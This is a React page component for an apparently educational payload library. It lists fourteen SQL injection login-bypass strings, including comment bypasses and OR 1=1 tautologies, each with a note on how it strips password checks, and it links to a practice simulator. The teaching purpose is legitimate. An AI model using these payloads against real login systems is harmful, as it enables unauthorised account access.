import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, Lock, Copy, Check, Search, ShieldAlert, Terminal } from 'lucide-react';

const payloadSections = [
  {
    id: 'standard-comment-bypass',
    title: 'Standard Comment Bypasses',
    description: 'Comment-based bypasses inject character sequences like `--`, `#`, or `/*` to instruct the SQL parser to ignore the rest of the query. By placing these immediately after the username field, the password verification logic is treated as a comment and ignored entirely.',
    payloads: [
      { code: "admin' --", desc: 'Standard double-dash comment bypass. Escapes the username quote and comments out password checks.', tags: ['Comment', 'Standard'] },
      { code: "admin' #", desc: 'MySQL style hash comment bypass. Neutralizes password validation on MySQL backends.', tags: ['MySQL', 'Comment'] },
      { code: "admin'--", desc: 'Double-dash comment variant without trailing space, compatible with certain DBMS profiles.', tags: ['Comment', 'Variant'] },
      { code: "administrator' --", desc: 'Attempts comment-bypass directly targeting the default "administrator" user account.', tags: ['Comment', 'Standard'] },
      { code: "root' --", desc: 'Attempts comment-bypass targeting the "root" superuser account.', tags: ['Comment', 'Standard'] },
      { code: "admin'; --", desc: 'Semicolon query terminator followed by standard double-dash comment bypass.', tags: ['Semicolon', 'Comment'] },
    ]
  },
  {
    id: 'tautology-logical-bypass',
    title: 'Tautology & Logical Bypasses',
    description: 'Logical tautology bypasses inject clauses that always evaluate to true (e.g., OR 1=1). When appended to the authentication query, they force the database verification to succeed even if the password check fails or the username is incorrect.',
    payloads: [
      { code: "admin' OR '1'='1", desc: 'Basic tautology bypass. Breaks string boundary and injects always-true comparison.', tags: ['Tautology', 'Quotes'] },
      { code: "admin' OR 1=1 --", desc: 'Integer-based tautology with double-dash comment to strip away password checks.', tags: ['Tautology', 'Integer'] },
      { code: "admin' OR '1'='1' --", desc: 'Standard string tautology followed by double-dash comment.', tags: ['Tautology', 'Quotes'] },
      { code: "user' OR '1'='1' --", desc: 'Generic account tautology bypass targeting "user" username roles.', tags: ['Tautology'] },
      { code: "') OR ('1'='1", desc: 'Parenthesized breakout attempting to close nested query segments with a tautology.', tags: ['Parenthesis', 'Tautology'] },
      { code: "')) OR '1'='1' --", desc: 'Double parenthesis breakout variant followed by tautology and comment.', tags: ['Parenthesis', 'Tautology'] },
      { code: "1' OR '1'='1", desc: 'Simple string tautology breakout starting with numeric input.', tags: ['Tautology'] },
      { code: "admin' OR 'x'='x", desc: 'Signature detection bypass using variable characters instead of numeric constants.', tags: ['Tautology', 'Bypass'] },
    ]
  }
];

export default function LoginBypassPayloads() {
  const [copiedText, setCopiedText] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');

  const allPayloads = [];
  payloadSections.forEach(section => {
    section.payloads.forEach(p => {
      allPayloads.push({
        ...p,
        sectionId: section.id,
        sectionTitle: section.title
      });
    });
  });

  const filteredPayloads = allPayloads.filter((p) => {
    const query = searchTerm.toLowerCase();
    return (
      p.code.toLowerCase().includes(query) ||
      p.desc.toLowerCase().includes(query) ||
      p.tags.some((t) => t.toLowerCase().includes(query))
    );
  });

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  return (
    <div className="space-y-10 select-none w-full max-w-5xl mx-auto">
      {/* Back Link */}
      <div className="flex items-center justify-between">
        <Link to="/payload-library" className="inline-flex items-center gap-2 text-xs font-mono text-cyber-dim hover:text-cyber-blue transition-colors">
          <ArrowLeft className="w-3.5 h-3.5" />
          back to payload library dashboard
        </Link>
        <span className="text-[10px] font-mono text-cyber-dim">MODULE: AUTH_BYPASS_v1.0</span>
      </div>

      {/* Header Info */}
      <div className="flex flex-col gap-2 border-b border-cyber-border/40 pb-6 w-full relative">
        <div className="absolute -top-4 right-0 w-24 h-24 bg-cyber-blue/10 blur-[40px] rounded-full pointer-events-none" />
        <span className="text-xs font-mono font-bold text-cyber-blue tracking-[4px] uppercase flex items-center gap-2">
          <Lock className="w-4.5 h-4.5 text-cyber-blue" />
          MODULE 02 — LOGIN BYPASS EXPLOITS
        </span>
        <h1 className="text-3xl font-extrabold text-cyber-title tracking-wide uppercase">
          Login Bypass <span className="text-cyber-blue">Payloads</span>
        </h1>
        <p className="text-cyber-dim text-sm text-justify leading-relaxed">
          Explore specialized authentication breakout sequences designed to strip password logic validation entirely. Search, review, and copy vetted bypass payloads to verify identity access controls.
        </p>
      </div>

      {/* Interactive Search Bar */}
      <div className="relative w-full max-w-md">
        <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-cyber-dim/60" />
        <input
          type="text"
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          placeholder="Search login bypass payloads..."
          className="w-full bg-cyber-input border border-cyber-border rounded-lg pl-10 pr-4 py-2.5 text-cyber-text placeholder-cyber-dim/40 focus:outline-none focus:border-cyber-blue focus:ring-1 focus:ring-cyber-blue/20 transition-all text-xs font-mono"
        />
      </div>

      {/* Main Payload Grid Section */}
      <div className="space-y-6">
        <div className="bg-cyber-card border border-cyber-border rounded-xl overflow-hidden shadow-lg">
          <div className="grid grid-cols-12 gap-3 px-6 py-3 border-b border-cyber-border bg-cyber-pre text-[10px] font-mono font-bold text-cyber-dim tracking-wider uppercase">
            <div className="col-span-4">Payload (SQL Code)</div>
            <div className="col-span-5">Mechanism & Impact Description</div>
            <div className="col-span-2">Tags</div>
            <div className="col-span-1 text-right">Actions</div>
          </div>

          <div className="divide-y divide-cyber-border/40 font-mono text-sm">
            {filteredPayloads.length > 0 ? (
              filteredPayloads.map((payload, pIdx) => (
                <div
                  key={pIdx}
                  className="grid grid-cols-12 gap-3 px-6 py-4 items-center hover:bg-cyber-blue/[0.02] transition-colors group"
                >
                  {/* Payload Code */}
                  <div className="col-span-4 select-text">
                    <code className="text-cyber-blue-light font-bold bg-cyber-pre/80 px-2.5 py-1.5 rounded-lg border border-cyber-border/60 block overflow-x-auto whitespace-nowrap">
                      {payload.code}
                    </code>
                  </div>

                  {/* Description */}
                  <div className="col-span-5 text-xs text-cyber-text leading-relaxed select-text font-sans">
                    {payload.desc}
                  </div>

                  {/* Tags */}
                  <div className="col-span-2 flex flex-wrap gap-1">
                    {payload.tags.map((tag, tIdx) => (
                      <span
                        key={tIdx}
                        className="text-[9px] font-bold uppercase tracking-wider bg-cyber-blue/10 border border-cyber-blue/20 text-cyber-blue-light px-1.5 py-0.2 rounded"
                      >
                        {tag}
                      </span>
                    ))}
                  </div>

                  {/* Actions */}
                  <div className="col-span-1 flex items-center justify-end gap-2">
                    <button
                      onClick={() => handleCopy(payload.code)}
                      className="p-1.5 rounded bg-cyber-pre border border-cyber-border hover:border-cyber-blue hover:bg-cyber-blue/5 text-cyber-dim hover:text-cyber-blue-light transition-all cursor-pointer relative"
                      title="Copy payload to clipboard"
                    >
                      {copiedText === payload.code ? (
                        <Check className="w-3.5 h-3.5 text-cyber-green" />
                      ) : (
                        <Copy className="w-3.5 h-3.5" />
                      )}
                    </button>
                  </div>
                </div>
              ))
            ) : (
              <div className="px-6 py-12 text-center text-cyber-dim font-mono text-sm">
                No matching payloads found for "{searchTerm}"
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Sandbox Redirection */}
      <div className="bg-cyber-card border border-cyber-border/70 rounded-2xl p-8 text-center space-y-5 shadow-2xl relative overflow-hidden">
        <span className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyber-blue to-transparent" />
        <h3 className="font-sans font-extrabold text-lg text-cyber-title tracking-wider uppercase">
          Simulate this in our Interactive Login Bypass Environment!
        </h3>
        <p className="text-sm text-cyber-text text-justify leading-relaxed">
          Test these payloads inside our live Login Bypass Simulator to see query compilation stages, connection pipes, and how injection strings bypass account authentication checks!
        </p>
        <div className="pt-2 flex justify-center">
          <Link
            to="/attacks/login-bypass"
            className="inline-flex items-center justify-center gap-2 bg-cyber-blue hover:bg-cyber-blue-light text-white px-8 py-3.5 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shadow-[0_0_15px_rgba(26,106,255,0.3)] hover:shadow-[0_0_25px_rgba(26,106,255,0.5)] transform hover:-translate-y-0.5"
          >
            Launch Live Login Bypass Simulator
          </Link>
        </div>
      </div>
    </div>
  );
}
